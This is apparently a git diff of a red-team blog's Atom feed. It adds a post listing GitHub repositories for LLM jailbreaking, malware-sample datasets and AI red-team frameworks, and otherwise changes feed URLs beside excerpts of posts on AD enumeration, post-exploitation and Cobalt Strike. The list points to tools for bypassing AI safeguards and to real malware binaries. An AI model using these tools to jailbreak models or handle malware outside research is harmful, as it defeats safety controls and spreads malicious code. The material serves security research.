@@ -1,4 +1,204 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="http://0.0.0.0:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://0.0.0.0:4000/" rel="alternate" type="text/html" /><updated>2026-03-20T12:04:40+00:00</updated><id>http://0.0.0.0:4000/feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">AD Enumeration Toolkit: Scripts I Actually Use</title><link href="http://0.0.0.0:4000/tools/red-team/ad-enumeration-toolkit/" rel="alternate" type="text/html" title="AD Enumeration Toolkit: Scripts I Actually Use" /><published>2026-01-06T00:00:00+00:00</published><updated>2026-01-06T00:00:00+00:00</updated><id>http://0.0.0.0:4000/tools/red-team/ad-enumeration-toolkit</id><content type="html" xml:base="http://0.0.0.0:4000/tools/red-team/ad-enumeration-toolkit/"><![CDATA[<p>Every red team engagement against Active Directory starts the same way: enumeration. Before you can exploit anything, you need to understand the environment. These are the scripts and one-liners I’ve built up over time that I actually use on engagements.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.10.0">Jekyll</generator><link href="https://dcodezero.github.io//feed.xml" rel="self" type="application/atom+xml" /><link href="https://dcodezero.github.io//" rel="alternate" type="text/html" /><updated>2026-03-20T17:47:41+00:00</updated><id>https://dcodezero.github.io//feed.xml</id><title type="html">Dcodezero</title><subtitle> </subtitle><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><entry><title type="html">AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know</title><link href="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/" rel="alternate" type="text/html" title="AI Red Teaming &amp;amp; Malware ML: GitHub Resources You Should Know" /><published>2026-03-20T00:00:00+00:00</published><updated>2026-03-20T00:00:00+00:00</updated><id>https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources</id><content type="html" xml:base="https://dcodezero.github.io//ai-security/red-team/ai-redteam-resources/"><![CDATA[<p>As AI systems get embedded into critical infrastructure, the attack surface grows — and so does the tooling available to security researchers. This post documents the most relevant GitHub repositories for AI red teaming, LLM jailbreaking, and malware ML research, organized by risk level and use case.</p>
+
+<blockquote>
+  <p>⚠️ <strong>Warning:</strong> Some repositories listed here contain actual malware samples or tools capable of bypassing AI safety systems. Use only in isolated, sandboxed environments.</p>
+</blockquote>
+
+<hr />
+
+<h2 id="-high-risk--potential-malware--offensive-tools">🔴 High Risk — Potential Malware / Offensive Tools</h2>
+
+<p>These repos contain either real malware samples or tools that can actively bypass AI safety mechanisms.</p>
+
+<h3 id="llm-attacksllm-attacks"><a href="https://github.com/llm-attacks/llm-attacks">llm-attacks/llm-attacks</a></h3>
+
+<p>Implements the <strong>GCG (Greedy Coordinate Gradient)</strong> attack — universal adversarial suffixes that can bypass safety filters on virtually any LLM. Published alongside a peer-reviewed research paper, this is one of the most cited offensive LLM tools in existence.</p>
+
+<p><strong>Risk:</strong> Direct safety bypass capability on production LLMs.</p>
+
+<hr />
+
+<h3 id="tml-epflllm-adaptive-attacks"><a href="https://github.com/tml-epfl/llm-adaptive-attacks">tml-epfl/llm-adaptive-attacks</a></h3>
+
+<p>ICLR 2025 paper — <em>“Jailbreaking Leading Safety-Aligned LLMs with Simple Adaptive Attacks.”</em> Contains jailbreak artifacts and scripts targeting GPT-4, Claude, Gemini, and other frontier models.</p>
+
+<p><strong>Risk:</strong> Ready-to-run jailbreak artifacts for major LLMs.</p>
+
+<hr />
+
+<h3 id="jiepoffensive-ai-compilation"><a href="https://github.com/jiep/offensive-ai-compilation">jiep/offensive-ai-compilation</a></h3>
+
+<p>Compilation of offensive AI/ML techniques covering:</p>
+<ul>
+  <li>Model stealing via prediction APIs</li>
+  <li>Hyperparameter theft</li>
+  <li>Web-scale training data poisoning</li>
+  <li>Adversarial example generation</li>
+</ul>
+
+<p><strong>Risk:</strong> Comprehensive offensive ML playbook.</p>
+
+<hr />
+
+<h3 id="cyber-researchaptmalware"><a href="https://github.com/cyber-research/APTMalware">cyber-research/APTMalware</a></h3>
+
+<p><strong>3,500+ real malware samples</strong> linked to 12 Advanced Persistent Threat (APT) groups. Used for benchmarking ML-based malware authorship attribution. Contains actual executables.</p>
+
+<p><strong>Risk:</strong> Real malware — sandbox only, never execute directly.</p>
+
+<hr />
+
+<h3 id="iosifachedikedataset"><a href="https://github.com/iosifache/DikeDataset">iosifache/DikeDataset</a></h3>
+
+<p>Labeled collection of benign and malicious <strong>PE and OLE files</strong> for training AI malware classifiers. Contains actual malicious binaries alongside benign samples.</p>
+
+<p><strong>Risk:</strong> Real malware binaries — handle with care.</p>
+
+<hr />
+
+<h2 id="-research--ai-red-teaming-datasets">🟠 Research — AI Red Teaming Datasets</h2>
+
+<p>Prompt and behavior datasets for evaluating LLM safety mechanisms. Generally safer to work with than the above, but still potentially sensitive.</p>
+
+<h3 id="navirockerllm-red-teaming-dataset"><a href="https://github.com/navirocker/llm-red-teaming-dataset">navirocker/llm-red-teaming-dataset</a></h3>
+
+<p>Comprehensive red teaming prompt dataset across <strong>8 AI safety risk categories</strong>:</p>
+<ul>
+  <li>Jailbreaking (system prompt injection, roleplay, hypothetical scenarios)</li>
+  <li>Harmful content generation</li>
+  <li>Privacy violations</li>
+  <li>Bias and fairness</li>
+  <li>Cybersecurity threats</li>
+  <li>Misinformation</li>
+  <li>Illegal activities</li>
+  <li>Psychological manipulation</li>
+</ul>
+
+<p>Cited in 2025 research. Good baseline for safety evaluations.</p>
+
+<hr />
+
+<h3 id="verazuojailbreak_llms"><a href="https://github.com/verazuo/jailbreak_llms">verazuo/jailbreak_llms</a></h3>
+
+<p>Official repo for <strong>ACM CCS 2024</strong>. Contains <strong>15,140 real ChatGPT prompts</strong> collected Dec 2022 to Dec 2023, including 1,405 confirmed jailbreak prompts — the largest in-the-wild jailbreak dataset publicly available.</p>
+
+<hr />
+
+<h3 id="jailbreakbenchjailbreakbench"><a href="https://github.com/JailbreakBench/jailbreakbench">JailbreakBench/jailbreakbench</a></h3>
+
+<p><strong>NeurIPS 2024</strong> Datasets and Benchmarks Track. The <strong>JBB-Behaviors</strong> dataset provides 200 distinct benign and misuse behaviors for tracking progress in jailbreak generation and defense over time.</p>
+
+<hr />
+
+<h3 id="damo-nlp-sgmultilingual-safety-for-llms"><a href="https://github.com/DAMO-NLP-SG/multilingual-safety-for-LLMs">DAMO-NLP-SG/multilingual-safety-for-LLMs</a></h3>
+
+<p><strong>ICLR 2024</strong> — The <strong>MultiJail</strong> dataset. Studies how multilingual inputs can bypass safety mechanisms that were primarily trained on English. A significant gap in most current LLM safety training.</p>
+
+<hr />
+
+<h3 id="allenaiwildjailbreak"><a href="https://huggingface.co/datasets/allenai/wildjailbreak">allenai/wildjailbreak</a></h3>
+
+<p><strong>262,000 vanilla and adversarial prompt-response pairs</strong> from the WildTeaming framework (Allen AI). Mines human-devised jailbreak tactics to programmatically generate diverse adversarial inputs. Primarily used for safety training rather than attacking.</p>
+
+<hr />
+
+<h2 id="-tools--red-teaming-frameworks">🟡 Tools — Red Teaming Frameworks</h2>
+
+<h3 id="azurepyrit"><a href="https://github.com/Azure/PyRIT">Azure/PyRIT</a></h3>
+
+<p>Microsoft’s <strong>Python Risk Identification Tool</strong> for generative AI. Provides a systematic, repeatable framework for red teaming LLMs. Widely adopted in enterprise AI security assessments.</p>
+
+<hr />
+
+<h3 id="leondzgarak"><a href="https://github.com/leondz/garak">leondz/garak</a></h3>
+
+<p>Think of it as <strong>nmap for LLMs</strong>. Probes for hallucination, data leakage, prompt injection, jailbreaks, and a growing list of vulnerability classes. Actively developed and one of the most production-ready scanners available.</p>
+
+<hr />
+
+<h3 id="sherdencoopergptfuzz"><a href="https://github.com/sherdencooper/GPTFuzz">sherdencooper/GPTFuzz</a></h3>
+
+<p><strong>Fuzzing-based jailbreak generation.</strong> Mutates seed prompts automatically to produce novel jailbreaks at scale. Useful for generating large test suites without manual effort.</p>
+
+<hr />
+
+<h3 id="confident-aideepteam"><a href="https://github.com/confident-ai/deepteam">confident-ai/deepteam</a></h3>
+
+<p>Open-source LLM red teaming framework released <strong>November 2025</strong>. Implements vulnerability classes including:</p>
+<ul>
+  <li>Prompt injection</li>
+  <li>PII leakage</li>
+  <li>Hallucinations</li>
+  <li>Encoding obfuscations</li>
+  <li>Multi-turn jailbreaks</li>
+</ul>
+
+<hr />
+
+<h3 id="promptfoopromptfoo"><a href="https://github.com/promptfoo/promptfoo">promptfoo/promptfoo</a></h3>
+
+<p>Open-source LLM testing and red teaming tool with CI/CD integration. Supports automated vulnerability scanning and regression testing — good for catching regressions after model updates.</p>
+
+<hr />
+
+<h3 id="kurogai100-redteam-projects"><a href="https://github.com/kurogai/100-redteam-projects">kurogai/100-redteam-projects</a></h3>
+
+<p>100 red team project ideas ranging from beginner to advanced. Useful for building out lab environments and developing systematic offensive skills.</p>
+
+<hr />
+
+<h2 id="-curated-lists--start-here-for-research">🔵 Curated Lists — Start Here for Research</h2>
+
+<table>
+  <thead>
+    <tr>
+      <th>Repository</th>
+      <th>Focus</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><a href="https://github.com/user1342/Awesome-LLM-Red-Teaming">user1342/Awesome-LLM-Red-Teaming</a></td>
+      <td>Best overall — frameworks, playgrounds, attack toolkits</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/corca-ai/awesome-llm-security">corca-ai/awesome-llm-security</a></td>
+      <td>LLM security focus, actively maintained</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/yueliu1999/Awesome-Jailbreak-on-LLMs">yueliu1999/Awesome-Jailbreak-on-LLMs</a></td>
+      <td>SOTA jailbreak methods, papers, code</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/wearetyomsmnv/Awesome-LLMSecOps">wearetyomsmnv/Awesome-LLMSecOps</a></td>
+      <td>LLM SecOps, updated Dec 2025</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/cybersecurity-dev/awesome-malware-datasets">cybersecurity-dev/awesome-malware-datasets</a></td>
+      <td>Malware ML datasets collection</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/shramos/Awesome-Cybersecurity-Datasets">shramos/Awesome-Cybersecurity-Datasets</a></td>
+      <td>Broad cybersecurity dataset list</td>
+    </tr>
+    <tr>
+      <td><a href="https://github.com/jivoi/awesome-ml-for-cybersecurity">jivoi/awesome-ml-for-cybersecurity</a></td>
+      <td>ML applied to security research</td>
+    </tr>
+  </tbody>
+</table>
+
+<hr />
+
+<h2 id="summary">Summary</h2>
+
+<p>The AI red teaming ecosystem has matured significantly. The tooling now rivals traditional offensive security in sophistication — with automated jailbreak generation, systematic probing frameworks, and large-scale benchmark datasets all publicly available.</p>
+
+<p>If you’re building a red team practice around AI systems, start with <strong>garak</strong> for scanning, <strong>PyRIT</strong> for structured assessments, and the <strong>JailbreakBench</strong> dataset for benchmarking your defenses.</p>
+
+<hr />
+
+<p><em>All tools and datasets listed here are intended for security research and defensive purposes. Use responsibly.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="AI-Security" /><category term="Red-team" /><category term="ai-red-teaming" /><category term="machine-learning" /><category term="llm-security" /><category term="jailbreak" /><category term="malware" /><category term="datasets" /><summary type="html"><![CDATA[A curated breakdown of the most important GitHub repositories for AI/LLM red teaming, jailbreak datasets, malware ML datasets, and offensive machine learning tools — with risk ratings and use-case notes.]]></summary></entry><entry><title type="html">AD Enumeration Toolkit: Scripts I Actually Use</title><link href="https://dcodezero.github.io//tools/red-team/ad-enumeration-toolkit/" rel="alternate" type="text/html" title="AD Enumeration Toolkit: Scripts I Actually Use" /><published>2026-01-06T00:00:00+00:00</published><updated>2026-01-06T00:00:00+00:00</updated><id>https://dcodezero.github.io//tools/red-team/ad-enumeration-toolkit</id><content type="html" xml:base="https://dcodezero.github.io//tools/red-team/ad-enumeration-toolkit/"><![CDATA[<p>Every red team engagement against Active Directory starts the same way: enumeration. Before you can exploit anything, you need to understand the environment. These are the scripts and one-liners I’ve built up over time that I actually use on engagements.</p>
 
 <p>No fluff. Just working code.</p>
 
@@ -454,7 +654,7 @@ if</span> <span class="o">[</span> <span class="nt">-s</span> <span class="s2">"
 
 <p>These scripts form the core of my AD enumeration workflow. They’re not fancy, but they work. Modify them for your needs, add error handling if you’re using them in production tools, and always test in a lab before an engagement.</p>
 
-<p>Next up: automating the exploitation phase once you’ve found those juicy misconfigurations.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="active-directory" /><category term="enumeration" /><category term="powershell" /><category term="python" /><category term="red-team" /><summary type="html"><![CDATA[PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.]]></summary></entry><entry><title type="html">Practical AI Red Teaming: Hands-On Attack Techniques and Tooling</title><link href="http://0.0.0.0:4000/ai-security/practical-ai-red-teaming-techniques/" rel="alternate" type="text/html" title="Practical AI Red Teaming: Hands-On Attack Techniques and Tooling" /><published>2026-01-06T00:00:00+00:00</published><updated>2026-01-06T00:00:00+00:00</updated><id>http://0.0.0.0:4000/ai-security/practical-ai-red-teaming-techniques</id><content type="html" xml:base="http://0.0.0.0:4000/ai-security/practical-ai-red-teaming-techniques/"><![CDATA[<p>Theory provides the foundation, but exploitation requires practical implementation. In this post, we transition from conceptual understanding to hands-on attack execution. We’ll build functional attack tools, demonstrate real-world exploitation techniques, and develop a comprehensive AI red team toolkit that you can deploy against target systems.</p>
+<p>Next up: automating the exploitation phase once you’ve found those juicy misconfigurations.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="active-directory" /><category term="enumeration" /><category term="powershell" /><category term="python" /><category term="red-team" /><summary type="html"><![CDATA[PowerShell and Python scripts for Active Directory enumeration. LDAP queries, BloodHound collection, and quick-win one-liners.]]></summary></entry><entry><title type="html">Practical AI Red Teaming: Hands-On Attack Techniques and Tooling</title><link href="https://dcodezero.github.io//ai-security/practical-ai-red-teaming-techniques/" rel="alternate" type="text/html" title="Practical AI Red Teaming: Hands-On Attack Techniques and Tooling" /><published>2026-01-06T00:00:00+00:00</published><updated>2026-01-06T00:00:00+00:00</updated><id>https://dcodezero.github.io//ai-security/practical-ai-red-teaming-techniques</id><content type="html" xml:base="https://dcodezero.github.io//ai-security/practical-ai-red-teaming-techniques/"><![CDATA[<p>Theory provides the foundation, but exploitation requires practical implementation. In this post, we transition from conceptual understanding to hands-on attack execution. We’ll build functional attack tools, demonstrate real-world exploitation techniques, and develop a comprehensive AI red team toolkit that you can deploy against target systems.</p>
 
 <p>This is where abstract vulnerabilities become concrete exploits.</p>
 
@@ -1635,7 +1835,7 @@ Risk Rating: {risk_rating}
 
 <hr />
 
-<p><em>This concludes our two-part series on AI Red Teaming. The code samples provided are for authorized security testing and research purposes. Always obtain proper authorization before testing systems you do not own.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="AI-Security" /><category term="ai-red-teaming" /><category term="adversarial-ml" /><category term="prompt-injection" /><category term="llm-hacking" /><category term="machine-learning-security" /><summary type="html"><![CDATA[This is where abstract vulnerabilities become concrete exploits.]]></summary></entry><entry><title type="html">External Recon Automation: Scripts That Save Hours</title><link href="http://0.0.0.0:4000/tools/red-team/recon-automation-scripts/" rel="alternate" type="text/html" title="External Recon Automation: Scripts That Save Hours" /><published>2026-01-05T00:00:00+00:00</published><updated>2026-01-05T00:00:00+00:00</updated><id>http://0.0.0.0:4000/tools/red-team/recon-automation-scripts</id><content type="html" xml:base="http://0.0.0.0:4000/tools/red-team/recon-automation-scripts/"><![CDATA[<p>Reconnaissance is where engagements are won or lost. Miss a subdomain, overlook an exposed service, skip a forgotten dev environment - and you miss your way in. Manual recon doesn’t scale. These scripts automate the boring parts so you can focus on what matters.</p>
+<p><em>This concludes our two-part series on AI Red Teaming. The code samples provided are for authorized security testing and research purposes. Always obtain proper authorization before testing systems you do not own.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="AI-Security" /><category term="ai-red-teaming" /><category term="adversarial-ml" /><category term="prompt-injection" /><category term="llm-hacking" /><category term="machine-learning-security" /><summary type="html"><![CDATA[This is where abstract vulnerabilities become concrete exploits.]]></summary></entry><entry><title type="html">External Recon Automation: Scripts That Save Hours</title><link href="https://dcodezero.github.io//tools/red-team/recon-automation-scripts/" rel="alternate" type="text/html" title="External Recon Automation: Scripts That Save Hours" /><published>2026-01-05T00:00:00+00:00</published><updated>2026-01-05T00:00:00+00:00</updated><id>https://dcodezero.github.io//tools/red-team/recon-automation-scripts</id><content type="html" xml:base="https://dcodezero.github.io//tools/red-team/recon-automation-scripts/"><![CDATA[<p>Reconnaissance is where engagements are won or lost. Miss a subdomain, overlook an exposed service, skip a forgotten dev environment - and you miss your way in. Manual recon doesn’t scale. These scripts automate the boring parts so you can focus on what matters.</p>
 
 <h2 id="the-recon-wrapper">The Recon Wrapper</h2>
 
@@ -2277,7 +2477,7 @@ python3 js_analyzer.py ./recon_target.com_<span class="k">*</span>/alive/live_ur
 
 <p>These scripts have found me countless bugs and entry points. Customize the wordlists, adjust the thread counts for your setup, and add your own signature patterns as you discover new technologies.</p>
 
-<p>Recon isn’t glamorous, but it’s where engagements are won.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="reconnaissance" /><category term="automation" /><category term="bash" /><category term="osint" /><category term="bug-bounty" /><summary type="html"><![CDATA[Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.]]></summary></entry><entry><title type="html">Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection</title><link href="http://0.0.0.0:4000/tools/red-team/post-exploitation-scripts/" rel="alternate" type="text/html" title="Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection" /><published>2026-01-04T00:00:00+00:00</published><updated>2026-01-04T00:00:00+00:00</updated><id>http://0.0.0.0:4000/tools/red-team/post-exploitation-scripts</id><content type="html" xml:base="http://0.0.0.0:4000/tools/red-team/post-exploitation-scripts/"><![CDATA[<p>You got a shell. Now what? The initial foothold is just the beginning. These are my go-to scripts for maintaining access, moving laterally, and extracting value from compromised systems.</p>
+<p>Recon isn’t glamorous, but it’s where engagements are won.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="reconnaissance" /><category term="automation" /><category term="bash" /><category term="osint" /><category term="bug-bounty" /><summary type="html"><![CDATA[Automated recon workflow - subdomain enumeration, port scanning, screenshots, tech fingerprinting, and cloud asset discovery.]]></summary></entry><entry><title type="html">Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection</title><link href="https://dcodezero.github.io//tools/red-team/post-exploitation-scripts/" rel="alternate" type="text/html" title="Post-Exploitation Scripts: Persistence, Pivoting &amp;amp; Data Collection" /><published>2026-01-04T00:00:00+00:00</published><updated>2026-01-04T00:00:00+00:00</updated><id>https://dcodezero.github.io//tools/red-team/post-exploitation-scripts</id><content type="html" xml:base="https://dcodezero.github.io//tools/red-team/post-exploitation-scripts/"><![CDATA[<p>You got a shell. Now what? The initial foothold is just the beginning. These are my go-to scripts for maintaining access, moving laterally, and extracting value from compromised systems.</p>
 
 <h2 id="situational-awareness">Situational Awareness</h2>
 
@@ -2791,7 +2991,7 @@ powershell <span class="nt">-c</span> <span class="s2">"Invoke-DataCollection"</
 
 <p>These scripts are starting points. Customize them for your environment, add error handling, implement OPSEC considerations (like clearing logs, using encrypted channels), and always test in a lab before using on real engagements.</p>
 
-<p>The difference between a good red teamer and a great one is the quality of their toolkit.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="post-exploitation" /><category term="persistence" /><category term="lateral-movement" /><category term="red-team" /><category term="powershell" /><summary type="html"><![CDATA[Scripts for maintaining access - credential harvesting, persistence mechanisms, lateral movement, and data exfiltration techniques.]]></summary></entry><entry><title type="html">Introduction to AI Red Teaming: Breaking Machine Learning Systems</title><link href="http://0.0.0.0:4000/ai-security/red-team/introduction-to-ai-red-teaming/" rel="alternate" type="text/html" title="Introduction to AI Red Teaming: Breaking Machine Learning Systems" /><published>2025-12-12T00:00:00+00:00</published><updated>2025-12-12T00:00:00+00:00</updated><id>http://0.0.0.0:4000/ai-security/red-team/introduction-to-ai-red-teaming</id><content type="html" xml:base="http://0.0.0.0:4000/ai-security/red-team/introduction-to-ai-red-teaming/"><![CDATA[<p>The rapid deployment of AI systems across critical infrastructure, healthcare, finance, and national security has created an entirely new attack surface that traditional security practitioners are only beginning to understand. AI Red Teaming represents the convergence of adversarial machine learning research and offensive security operations, targeting the unique vulnerabilities inherent in systems that learn from data and make autonomous decisions.</p>
+<p>The difference between a good red teamer and a great one is the quality of their toolkit.</p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="Tools" /><category term="Red-team" /><category term="post-exploitation" /><category term="persistence" /><category term="lateral-movement" /><category term="red-team" /><category term="powershell" /><summary type="html"><![CDATA[Scripts for maintaining access - credential harvesting, persistence mechanisms, lateral movement, and data exfiltration techniques.]]></summary></entry><entry><title type="html">Introduction to AI Red Teaming: Breaking Machine Learning Systems</title><link href="https://dcodezero.github.io//ai-security/red-team/introduction-to-ai-red-teaming/" rel="alternate" type="text/html" title="Introduction to AI Red Teaming: Breaking Machine Learning Systems" /><published>2025-12-12T00:00:00+00:00</published><updated>2025-12-12T00:00:00+00:00</updated><id>https://dcodezero.github.io//ai-security/red-team/introduction-to-ai-red-teaming</id><content type="html" xml:base="https://dcodezero.github.io//ai-security/red-team/introduction-to-ai-red-teaming/"><![CDATA[<p>The rapid deployment of AI systems across critical infrastructure, healthcare, finance, and national security has created an entirely new attack surface that traditional security practitioners are only beginning to understand. AI Red Teaming represents the convergence of adversarial machine learning research and offensive security operations, targeting the unique vulnerabilities inherent in systems that learn from data and make autonomous decisions.</p>
 
 <p>This post establishes the foundational concepts of AI red teaming, dissects the threat landscape, and provides a technical framework for understanding how modern AI systems can be compromised, manipulated, and exploited.</p>
 
@@ -3286,7 +3486,7 @@ previous conversation context.]"
 
 <hr />
 
-<p><em>Stay tuned for Part 2: Practical AI Red Teaming Techniques, where we’ll build and deploy actual attacks against ML systems.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="AI-Security" /><category term="Red-team" /><category term="ai-red-teaming" /><category term="-" /><category term="machine-learning" /><category term="-" /><category term="adversarial-attacks" /><category term="-" /><category term="llm-security" /><category term="-" /><category term="prompt-injection" /><summary type="html"><![CDATA[This post establishes the foundational concepts of AI red teaming, dissects the threat landscape, and provides a technical framework for understanding how modern AI systems can be compromised, manipulated, and exploited.]]></summary></entry><entry><title type="html">HomeLab Part-02: The Upgrade to Dell R730xd</title><link href="http://0.0.0.0:4000/it/homelab-upgrade-r730xd/" rel="alternate" type="text/html" title="HomeLab Part-02: The Upgrade to Dell R730xd" /><published>2025-09-21T00:00:00+00:00</published><updated>2025-09-21T00:00:00+00:00</updated><id>http://0.0.0.0:4000/it/homelab-upgrade-r730xd</id><content type="html" xml:base="http://0.0.0.0:4000/it/homelab-upgrade-r730xd/"><![CDATA[<h1 id="the-upgrade-from-hp-dl380-g7-to-dell-r730xd">The Upgrade: From HP DL380 G7 to Dell R730xd</h1>
+<p><em>Stay tuned for Part 2: Practical AI Red Teaming Techniques, where we’ll build and deploy actual attacks against ML systems.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="AI-Security" /><category term="Red-team" /><category term="ai-red-teaming" /><category term="-" /><category term="machine-learning" /><category term="-" /><category term="adversarial-attacks" /><category term="-" /><category term="llm-security" /><category term="-" /><category term="prompt-injection" /><summary type="html"><![CDATA[This post establishes the foundational concepts of AI red teaming, dissects the threat landscape, and provides a technical framework for understanding how modern AI systems can be compromised, manipulated, and exploited.]]></summary></entry><entry><title type="html">HomeLab Part-02: The Upgrade to Dell R730xd</title><link href="https://dcodezero.github.io//it/homelab-upgrade-r730xd/" rel="alternate" type="text/html" title="HomeLab Part-02: The Upgrade to Dell R730xd" /><published>2025-09-21T00:00:00+00:00</published><updated>2025-09-21T00:00:00+00:00</updated><id>https://dcodezero.github.io//it/homelab-upgrade-r730xd</id><content type="html" xml:base="https://dcodezero.github.io//it/homelab-upgrade-r730xd/"><![CDATA[<h1 id="the-upgrade-from-hp-dl380-g7-to-dell-r730xd">The Upgrade: From HP DL380 G7 to Dell R730xd</h1>
 
 <p>In my <a href="/it/Homelab/">previous homelab post</a>, I talked about running my infrastructure on an HP Proliant DL380 G7 with dual Xeon X5650 processors. That server served me well, but it was time for an upgrade.</p>
 
@@ -3581,7 +3781,7 @@ previous conversation context.]"
 
 <hr />
 
-<p><em>In the next post, I’ll cover the network architecture and how I isolate lab environments from my home network.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="Infra" /><category term="Infrastructure" /><category term="Dell" /><category term="Proxmox" /><summary type="html"><![CDATA[Upgrading from HP DL380 G7 to Dell R730xd - more cores, better efficiency, and ready to host AD labs.]]></summary></entry><entry><title type="html">HackTheBox UnderPass</title><link href="http://0.0.0.0:4000/hackthebox/Underpass/" rel="alternate" type="text/html" title="HackTheBox UnderPass" /><published>2025-01-10T00:00:00+00:00</published><updated>2025-01-10T00:00:00+00:00</updated><id>http://0.0.0.0:4000/hackthebox/Underpass</id><content type="html" xml:base="http://0.0.0.0:4000/hackthebox/Underpass/"><![CDATA[<h3 id="nmap-scan">Nmap scan:</h3>
+<p><em>In the next post, I’ll cover the network architecture and how I isolate lab environments from my home network.</em></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="IT" /><category term="HomeLab" /><category term="IT" /><category term="Infra" /><category term="Infrastructure" /><category term="Dell" /><category term="Proxmox" /><summary type="html"><![CDATA[Upgrading from HP DL380 G7 to Dell R730xd - more cores, better efficiency, and ready to host AD labs.]]></summary></entry><entry><title type="html">HackTheBox UnderPass</title><link href="https://dcodezero.github.io//hackthebox/Underpass/" rel="alternate" type="text/html" title="HackTheBox UnderPass" /><published>2025-01-10T00:00:00+00:00</published><updated>2025-01-10T00:00:00+00:00</updated><id>https://dcodezero.github.io//hackthebox/Underpass</id><content type="html" xml:base="https://dcodezero.github.io//hackthebox/Underpass/"><![CDATA[<h3 id="nmap-scan">Nmap scan:</h3>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Starting Nmap 7.94 ( https://nmap.org ) at 2025-01-08 22:49 PST
 Nmap scan report for 10.10.11.48
@@ -3800,7 +4000,7 @@ svcMosh@underpass:~$ cat user.txt
 </code></pre></div></div>
 <p><img src="/assets/images/sample/Underpass/11.png" alt="1.png" /></p>
 
-<p><img src="/assets/images/sample/Underpass/10.png" alt="1.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="HTB" /><category term="Linux" /><summary type="html"><![CDATA[UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.]]></summary></entry><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="http://0.0.0.0:4000/red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+00:00</published><updated>2024-12-25T00:00:00+00:00</updated><id>http://0.0.0.0:4000/red-team/Malleable-c2-pro</id><content type="html" xml:base="http://0.0.0.0:4000/red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
+<p><img src="/assets/images/sample/Underpass/10.png" alt="1.png" /></p>]]></content><author><name>DcodeZer0</name><email>dcodezero@proton.me</email></author><category term="hackthebox" /><category term="HTB" /><category term="Linux" /><summary type="html"><![CDATA[UnderPass is a HTB easy linux machine, Created by dakkmaddy. The Box is mainly based on Enumerations and basic priv escalations.]]></summary></entry><entry><title type="html">Cobalt Strike Malleable C2 Profiles</title><link href="https://dcodezero.github.io//red-team/Malleable-c2-pro/" rel="alternate" type="text/html" title="Cobalt Strike Malleable C2 Profiles" /><published>2024-12-25T00:00:00+00:00</published><updated>2024-12-25T00:00:00+00:00</updated><id>https://dcodezero.github.io//red-team/Malleable-c2-pro</id><content type="html" xml:base="https://dcodezero.github.io//red-team/Malleable-c2-pro/"><![CDATA[<h1 id="overview">Overview</h1>
 
 <p>Beacon’s HTTP indicators are controlled by a Malleable Command and Control (Malleable C2) profile. A Malleable C2 profile is a simple program that specifies how to transform data and store it in a transaction. The same profile that transforms and stores data, interpreted backwards, also extracts and recovers data from a transaction.</p>
 
@@ -3890,7 +4090,7 @@ svcMosh@underpass:~$ cat user.txt
 
 <p>right click and check for follow TCP-stream</p>
 
